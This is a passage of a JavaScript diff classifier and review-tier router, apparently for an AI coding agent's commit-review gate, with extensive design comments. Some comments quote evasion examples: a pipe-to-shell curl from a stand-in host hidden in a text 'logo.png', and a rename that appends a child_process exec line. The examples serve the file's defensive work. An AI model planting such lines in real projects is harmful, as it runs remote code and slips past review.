    // exec-capable env name on a changed line; any `bare` (except tsconfig.json)
    // string on a changed line (key out of view — this also makes every permissions allow/deny entry
    // CODE, a security surface, by design); and in script manifests any changed `"k": "v"` whose v
    // is not a version spec — the key is IGNORED on purpose, since `"scripts"` may be out of view,
    // so a `description`/`main`/`repository` edit is CODE too (accepted cost; pinned by canary).
    // Rejected: "any change to these basenames is CODE" — replayed over 400 commits × 6 repos, 16
    // changes scored inert and all 16 were benign (model pins, effortLevel, plugin toggles,
    // dependency adds); 9 of them were ~/.claude settings.json edits in wrap commits that would
    // each have drawn a T2 slate for nothing.
    if (NEVER_DATA_JSON.has(b)) {
      if (EXEC_KEY.test(full) || CONTROL_KEY.test(hunk) || ENV_EXEC_NAME.test(hunk)) return { code: true, exec: true };
      for (const l of changedArr(body)) {
        for (const s of jsonStrings(l)) {
          if (s.kind === 'bare' && !NO_BARE_NET.has(b)) return { code: true, exec: true };
          if (s.kind === 'value' && SCRIPT_MANIFESTS.has(b) && !isVersionSpec(s.text)) return { code: true, exec: true };
        }
      }
    }
    // Allowlist is consulted only AFTER the exec-key net. The blocking bugs (S256, kg S2) were
    // both SHELL_VALUE firing on PROSE; neither justified exempting a hook key. An allowlisted
    // path carrying `"command"`/`"hooks"` is not ambiguous-in-favour-of-inert — fail toward CODE
    // (header contract above). Ordering found by review 2026-08-22, reproduced by execution.
    // scripts/bin net BEFORE the allowlist, for the same reason EXEC_KEY is: a path pattern must
    // never be able to clear a package.json whose scripts block is in the diff window.
    if (b === 'package.json' && /"(scripts|bin)"\s*:/.test(full)) return { code: true, exec: true }; // scripts/bin edit
    if (isDataJsonPath(path)) return { code: false, exec: false };  // named pure-data file (path-anchored, any json flavour)
    // Script manifests skip SHELL_VALUE: the NEVER_DATA_JSON scan above already failed every changed
    // value that is not a version spec, so any value left is a vetted constraint — and SHELL_VALUE
    // only misfires on those (`"^8.1 || ^8.2"` reads as `||`, `"npm:lodash@^4"` as the npm word).
    if (!SCRIPT_MANIFESTS.has(b) && SHELL_VALUE.test(hunk)) return { code: true, exec: true }; // shell-shaped value under ANY key (injection)
    return { code: false, exec: false };                         // pure data → inert
  }
  if (INERT_BASENAMES.has(b)) return { code: false, exec: false };
  if (INERT_EXT.has(e)) return { code: false, exec: false };
  if (e === '') {                                                 // extensionless
    if (body.some(l => SHEBANG.test(l))) return { code: true, exec: true };  // shebang script → exec
    if (DOC_MARKERS.has(b)) return { code: false, exec: false };  // LICENSE/CHANGELOG/… → inert
    return { code: true, exec: true };                           // unknown extensionless → FAIL TOWARD CODE+EXEC
  }
  return { code: true, exec: true };                             // unknown extension → FAIL TOWARD CODE+EXEC
}

// ── Tier ladder (SKILL Step 4.5) ─────────────────────────────────────────────
// This arithmetic lived as PROSE in SKILL.md and was recalibrated twice (S165, S256) for the
// same complaint. Measured across 149 runs: 71% spawned >=5 agents, T0 fired ONCE, and 63%
// never announced a tier — the announcement being the skill's own control on the control.
// The 71% above is the BEFORE number -- the evidence that motivated the move to code.
// AFTER: run `python3 ~/.claude/evals/measure_review_tiers.py --canonical-only`. Deliberately no digits here -- one number in five files is how the /hook-review date drifted 20 days (governance.md).
// P16's stopping rule (3rd tuning ⇒ escalate to code) is why it is computed here instead: the
// model reads a tool result rather than remembering an instruction.
// The GATE IS EVALUATED FIRST and its three conditions are one-way ratchets; T0/T1/T1.5 are
// reachable only after it says no. Every unknown fails toward MORE review.

// FANOUT WAS HERE AND IS DELETED — do not reintroduce it as a text search (S54 review).
// It counted `git grep -w -F <basename>` hits as "importers", i.e. word MENTIONS, not import
// edges. Measured over the last 120 commits of this repo: 9 diffs reached it and ALL 9 became
// T2, while T1/T1.5 fired ZERO times — it reproduced the very 71%-full-slate failure this work
// exists to remove. The counts were fabrications: "7 importers of verify_claude_md.py" against
// an actual import count of 0 (the hits were sibling scripts naming it in prose, canary scripts
// invoking it, and session-registry.yaml — 557KB of session prose that names nearly every
// script here, a near-universal +1 to every score). It also fails in the SAFE direction, which
// is why five rounds of green assertions never caught it.
// A real import-edge matcher is language-specific (require/import/from + quoted path per
// language) — strictly more machinery than the signal is worth, and EXEC + CONTRACT already
// cover the interface-blast case. What is lost: a body-only edit to a widely-imported internal
// helper now gets T1/T1.5 instead of T2. It never gets 0 reviewers, and by definition it
// changes no interface. Deleting it also removed --tier-repo, importerCount, inertHit,
// isCommentOnly and COMMENT_LINE (which misread `#define`, `*ptr`, `--counter` as comments and
// silently UNDER-reviewed) — ~12 review findings resolved by removing one wrong signal (P69).

// Only ---/+++ lines BEFORE the first @@ are file headers. A prefix test alone silently ate a
// DELETED line whose source text began with `--` (Lua/SQL comment): it renders as `--- ...`,
// was read as a header, and the file then scored as having no changes at all → netAdditive
// vacuously true → T0 → ZERO reviewers. Shared with classify() so the two gates cannot diverge.
function changedArr(body) {
  const out = [];
  let inHunk = false;
  for (const l of body) {
    if (l.startsWith('@@')) { inHunk = true; continue; }
    if (!inHunk && (l.startsWith('+++ ') || l.startsWith('--- '))) continue;
    if (l[0] === '+' || l[0] === '-') out.push(l);
  }
  return out;
}
// Source extensions only. The bare `index.<anything>` form predates media being CODE:
// once `index.png` classified as code it matched, emitting CONTRACT:true and the reason
// "existing exported interface changed: assets/index.png" -- a false claim about a binary
// blob, on the commonest hero-image name, which SKILL Step 4.5 orders announced verbatim.
// A lying audit trail is the P53 failure this file forbids two screens down.
const isBarrel = p => /(^|\/)index\.(ts|tsx|js|jsx|mjs|cjs|py|rb|vue|svelte)$/.test(p);  // re-export hub
const isDts = p => /\.d\.ts$/.test(p);                        // ambient type contract
// An exported signature. Covers JS/TS (`export`, `module.exports`) and Python (`__all__`);
// Ruby and Go (capitalisation) have no textual analogue and are not modelled here.
// The MINUS side is required: a contract can only BREAK if something that already existed
// changed or vanished. A purely additive `+export function helper()` has no consumers yet, so
// it forced T2 on every new TS file — measured at 30% of commits in a TypeScript project and
// 22.5% in [redacted], i.e. the over-firing bug in a new place.
const EXPORT_SIG_REMOVED = /^-\s*(export\b|module\.exports\b|exports\.[A-Za-z_$][\w$]*\s*=|__all__\s*=)/m;
// Module scope (not inside computeTier) so the slate's fail-up path applies the SAME rename and
// contract predicates without a signals object — one definition, no drift (P51).
const renamed = x => x.originPath != null && x.originPath !== x.path;
const witness = x => renamed(x) ? `${x.path} (from ${x.originPath})` : x.path;
const isContractPath = pth => isBarrel(pth) || isDts(pth);
const touchesContract = x => isContractPath(x.path) || (renamed(x) && isContractPath(x.originPath)) ||
  EXPORT_SIG_REMOVED.test(changed(x.body));

function computeTier(classified) {
  const code = classified.filter(x => x.code);
  const sig = { EXEC: false, N: code.length, CONTRACT: false, GREEN, netAdditive: false, MEDIA: false, RENAME: false };
  if (code.length === 0) return { tier: 'T0', tierReason: 'no unreviewed code files — content-only', signals: sig };

  // A rename escalated by its ORIGIN must say so. Reporting only the b-side makes the
  // announced tierReason a false claim about a file that carries no such surface — the same
  // P53 objection this file already makes about the index.png CONTRACT reason and the
  // netAdditive:false overwrite. codeFiles/execFiles keep bare paths: those are consumed
  // path lists, not prose. (renamed/witness live at module scope, above.)
  const execPaths = code.filter(x => x.exec).map(witness);
  sig.EXEC = execPaths.length > 0;
  // Barrels and .d.ts are interface files by construction, so path alone escalates them.
  // Path-derived signals are unioned over BOTH sides for the same reason classify() is:
  // `git mv src/index.ts src/hub.ts` relabelled a barrel out of this ratchet and scored T0.
  // Measured 2026-08-27: identical body, T2 in place -> T0 renamed. Canary §6.6 pins it.
  const contractPaths = code.filter(touchesContract).map(witness);
  sig.CONTRACT = contractPaths.length > 0;
  // A diff with NO parsed change lines is UNKNOWN, never "safely additive". `[].every()` is
  // vacuously true, and git emits exactly that body for renames, `chmod +x`, and binary
  // replacements — so `git mv` on a module with 20 importers scored T0 (zero reviewers).
  sig.netAdditive = code.every(x => {
    const ch = changedArr(x.body);
    return ch.length > 0 && ch.every(l => l[0] === '+');
  });
  // MEDIA_EXT is T0-INELIGIBLE regardless of body shape (2026-08-26, security review).
  // The demotion's safety argument (see the MEDIA_EXT block above) is that a media body
  // parses to ZERO change lines, so netAdditive stays false and T0 is unreachable. But
  // NOTHING required a media file to actually BE binary: a TEXT-bodied `logo.png` holding
  //     +curl https://evil.sh | sh
  // parses to real `+` lines, netAdditive goes TRUE, and it scored T0 — ZERO reviewers.
  // Reproduced against the committed classifier. The shebang net one screen up catches the
  // same file the moment it carries `#!`, which is exactly the shape an attacker omits.
  // This is the identical objection already accepted for html/htm, applied to the members
  // that were let in on an ASSUMPTION of binariness that was never checked.
  // Deliberately NOT fixed by widening SHEBANG — content-sniffing over-fires (see above),
  // and every new evasion would need another pattern. Removing T0 eligibility fails safe
  // for all MEDIA_EXT members at once and costs at most one reviewer on a screenshot diff.
  // MEDIA is its OWN signal and does NOT overwrite netAdditive. An earlier draft set
  // netAdditive=false here; review rejected it — `signals` is a PUBLISHED contract that
  // SKILL.md Step 4.5 reads and is forbidden to re-derive, so reporting netAdditive:false
  // for a genuinely additive diff is a lying audit trail (the same objection this file makes
  // about a wrong tierReason), and it left no input able to tell "media" from "has deletions".
  const mediaPaths = code.filter(x => MEDIA_EXT.has(ext(x.path)) || (renamed(x) && MEDIA_EXT.has(ext(x.originPath)))).map(witness);
  sig.MEDIA = mediaPaths.length > 0;
  // RENAME is T0-ineligible, for the SAME reason MEDIA is: the property was already decided
  // (canary §6 "rename-only diff -> NOT T0"), but it was enforced only by an ACCIDENT of body
  // shape — a 100%-similarity rename parses to zero change lines, so netAdditive stayed false.
  // A PARTIAL-similarity rename emits a normal hunk. Measured 2026-08-27 against real `git mv`:
  //   git mv src/a.ts notes.txt && echo 'require("child_process").exec(...)' >> notes.txt
  //   -> {"tier":"T0","tierReason":"one net-additive source file, checks green"}  ZERO reviewers
  // on a diff that DELETED a module (breaking every importer, with no `-export` line for
  // EXPORT_SIG_REMOVED to see) AND added a shell-exec line. netAdditive:true is also a false
  // statement there — a rename deletes its source. Like MEDIA, RENAME is its OWN signal and
  // does NOT overwrite netAdditive: `signals` is a PUBLISHED contract, and clobbering it would
  // leave no input able to tell "renamed" from "has deletions" (the objection that killed the
  // netAdditive=false draft above). Canary §6.6 pins it WITH --green, the only flag under which
  // t0Shape is reachable at all — every fixture omitting it tests a case that cannot fail.
  const renamedPaths = code.filter(renamed).map(witness);
  sig.RENAME = renamedPaths.length > 0;

  // Gate first — two one-way ratchets, neither walkable back.
  if (sig.EXEC) return { tier: 'T2', tierReason: `execution/build surface changed: ${execPaths.join(', ')}`, signals: sig };
  if (sig.CONTRACT) return { tier: 'T2', tierReason: `existing exported interface changed: ${contractPaths.join(', ')}`, signals: sig };
  // Only now may the ladder de-escalate. Breadth alone is T1.5, never the full slate (S256).
  // ONE definition of the T0 shape. Written twice, a later edit to one copy (say N <= 2)
  // silently restores T0 eligibility for media — the drift this guard exists to prevent.
  const t0Shape = sig.N === 1 && GREEN && sig.netAdditive;
  if (t0Shape && sig.MEDIA)
    return { tier: 'T1', tierReason: `media file is T0-ineligible (extension is not evidence of binariness): ${mediaPaths.join(', ')}`, signals: sig };
  if (t0Shape && sig.RENAME)
    // Wording covers COPIES too (`copy from`/`copy to`, reachable only with -C, which the
    // production caller does not pass). The earlier text asserted "a rename deletes its
    // source", which is FALSE of a copy — the same lying-audit-trail defect this file rejects
    // for the index.png CONTRACT reason and the netAdditive:false draft. The property that is
    // true of both: the b-side body is not the whole change.
    return { tier: 'T1', tierReason: `renamed/copied file is T0-ineligible (the b-side body is not the whole change): ${renamedPaths.join(', ')}`, signals: sig };
  if (t0Shape) return { tier: 'T0', tierReason: 'one net-additive source file, checks green', signals: sig };
  if (sig.N <= 2) return { tier: 'T1', tierReason: `${sig.N} source file(s), no exec or contract signal`, signals: sig };
  return { tier: 'T1.5', tierReason: `${sig.N} source files — breadth without risk shape`, signals: sig };
}

// ── Reviewer slate (review-router P1 §2.2, 2026-09-15) ─────────────────────────
// `tier` above is UNTOUCHED and stays the published contract (wrap, measure_review_tiers.py,
// canary §6.5–6.7, [redacted] roster). `slate` is added BESIDE it, under --tier only:
// hire reviewers by JOB, using only signals this file already computes plus two path rules.
// No cap: the widest realistic slate is 7, and only on a diff that touches every surface.
// Not modelled (needs a measured fire rate first): trust-boundary content, async-UI races,
// performance, new-module structure. Security coverage = today's (every T2 diff).
const UNIVERSAL_LEGACY = ['ce-code-simplicity-reviewer', 'ce-security-sentinel', 'ce-performance-oracle',
  'ce-architecture-strategist', 'ce-pattern-recognition-specialist'];
const RAILS_EXT = new Set(['rb', 'erb', 'rake', 'jbuilder', 'haml', 'axlsx']);
const TS_EXT = new Set(['ts', 'tsx', 'js', 'jsx', 'mjs', 'cjs']);
const langOf = p => {
  if (p == null) return null;
  const e = ext(p), b = base(p);
  if (RAILS_EXT.has(e) || b === 'Gemfile' || b === 'Rakefile') return 'ce-kieran-rails-reviewer';
  if (e === 'py') return 'ce-kieran-python-reviewer';
  if (TS_EXT.has(e)) return 'ce-kieran-typescript-reviewer';
  return null;
};
// Directory-anchored, so `gate_entry_register.html.erb` / `abstention_gate.rb` never match.
const SCHEMA_PATH = /(^|\/)db\/migrate\/|(^|\/)db\/schema\.rb$|(^|\/)migrations\/[^/]+\.(py|sql)$|\.sql$/;
// ROOT-anchored where the surface only exists at a root: `(^|/)hooks/` hired adversarial on every
// React `src/hooks/useX.ts` and `app/javascript/hooks/useAuth.ts` (review finding). Review/gate
// hooks live at the ~/.claude root or a project's .claude/; skill scripts and in-repo git hooks may
// nest; settings files are only honoured at the root or under .claude/.
const MACHINERY_PATH = /^(\.claude\/)?hooks\/|(^|\/)skills\/[^/]+\/scripts\/|(^|\/)\.git-?hooks\/|^(\.claude\/)?settings(\.local)?\.json$/;

// Up to 2 languages over CODE files, ordered by changed lines (ties: first seen). A file counts
// toward the language of its path AND of its origin: a rename app/models/x.rb -> scripts/x.py is a
// Ruby deletion and a Python addition, so it hires both readers (the first draft kept only one).
function languages(code) {
  const lines = new Map();
  for (const x of code) {
    const langs = new Set([langOf(x.path), langOf(x.originPath)].filter(Boolean));
    for (const lang of langs) lines.set(lang, (lines.get(lang) || 0) + changedArr(x.body).length);
  }
  return [...lines.entries()].sort((a, b) => b[1] - a[1]).slice(0, 2);
}

// Path rules shared by the normal and the fail-up slate. `contract` is passed in: the normal path
// uses the published CONTRACT signal; fail-up has no signals and re-derives it per parsed file.
// `securityBecause` (T2 only) is hired between language and contract to keep the published order.
function hirePathRules(code, hire, contract, securityBecause) {
  const touches = (x, re) => re.test(x.path) || (x.originPath != null && re.test(x.originPath));
  for (const [lang, n] of languages(code)) hire(lang, 'language', `${n} changed line(s) in its language`);
  if (securityBecause) hire('ce-security-sentinel', 'security', securityBecause);
  if (contract) hire('ce-api-contract-reviewer', 'contract', 'CONTRACT signal: existing exported interface changed');
  const schemaPaths = code.filter(x => touches(x, SCHEMA_PATH)).map(witness);
  if (schemaPaths.length) hire('ce-data-migrations-reviewer', 'schema', `schema path: ${schemaPaths.join(', ')}`);
  const machineryPaths = code.filter(x => touches(x, MACHINERY_PATH)).map(witness);
  if (machineryPaths.length) hire('ce-adversarial-reviewer', 'gate-machinery', `review/gate machinery path: ${machineryPaths.join(', ')}`);
}

const slateBuilder = () => {
  const slate = [];
  const hire = (agent, job, because) => { if (!slate.some(s => s.agent === agent)) slate.push({ agent, job, because }); };
  return { slate, hire };
};

// FAIL_UP = the legacy full slate UNION the path-rule hires for whatever files did parse: a garbage
// header next to hooks/check.js must still bring the adversarial reader, not only the legacy five.
function failUpSlate(classified, because) {
  const { slate, hire } = slateBuilder();
  for (const agent of ['ce-correctness-reviewer', ...UNIVERSAL_LEGACY]) hire(agent, 'fail-up', because);
  try {
    const code = (classified || []).filter(x => x.code && !x.forced);
    hirePathRules(code, hire, code.some(touchesContract), null);
  } catch { /* the legacy slate above already stands */ }
  return slate;
}

function computeSlate(classified, tierResult) {
  // Unparseable diff / git error (signals null) OR an unparseable `diff --git` header (forced).
  if (tierResult.signals == null || classified.some(x => x.forced))
    return failUpSlate(classified, 'slate could not be computed — legacy full slate');
  // T0 hires nobody (owner decision) — including a net-additive new file under a machinery path.
  if (tierResult.tier === 'T0') return [];
  const code = classified.filter(x => x.code);
  const { slate, hire } = slateBuilder();
  hire('ce-correctness-reviewer', 'correctness', `${code.length} code file(s) at ${tierResult.tier}`);
  hirePathRules(code, hire, tierResult.signals.CONTRACT, tierResult.tier === 'T2' ? tierResult.tierReason : null);
  return slate;
}
// Wrapped: a throw in the slate must never lose contentOnly or change tier — it fails UP, and says why.
function withSlate(classified, tierResult) {
  let slate;
  try { slate = computeSlate(classified, tierResult); }
  catch (e) { slate = failUpSlate(null, `slate could not be computed: ${e && e.message}`); }
  return { ...tierResult, slate };
}

const emit = (obj, tierResult) => {
  process.stdout.write(JSON.stringify(WANT_TIER ? { ...obj, ...tierResult } : obj) + '\n');
  process.exit(0);
};
// signals are NULL, not invented. SKILL Step 4.5 tells the model to quote them as audit
// evidence; emitting EXEC:true / N:1 for a diff that was never parsed makes the audit trail
// lie in precisely the state where a reader most needs the truth (P53).
const FAIL_UP = reason => ({ tier: 'T2', tierReason: reason, signals: null });

if (errored) {                                                    // git/stdin error ≠ empty diff
  emit({ contentOnly: false, codeFiles: ['<diff-error>'], execFiles: ['<diff-error>'] }, withSlate([], FAIL_UP('diff could not be read — failing up')));
}
const files = parse(diff);
if (files.length === 0 && diff.trim() !== '') {                   // non-empty but unrecognized → fail toward code
  emit({ contentOnly: false, codeFiles: ['<unparseable-diff>'], execFiles: ['<unparseable-diff>'] }, withSlate([], FAIL_UP('diff could not be parsed — failing up')));
}
const classified = files.map(f => ({ path: f.path, originPath: f.originPath, body: f.body, forced: f.forced, ...classify(f) }));
const codeFiles = classified.filter(x => x.code).map(x => x.path);
const execFiles = classified.filter(x => x.code && x.exec).map(x => x.path);
// Lazy: without --tier the tier pipeline must not run at all. It used to be evaluated eagerly
// and discarded, so the commit-blocking caller (check-review-gate.js, which has no --tier)
// inherited every throw surface in it — and its catch{} turns any exception into a commit BLOCK.
emit({ contentOnly: codeFiles.length === 0, codeFiles, execFiles }, WANT_TIER ? withSlate(classified, computeTier(classified)) : null);
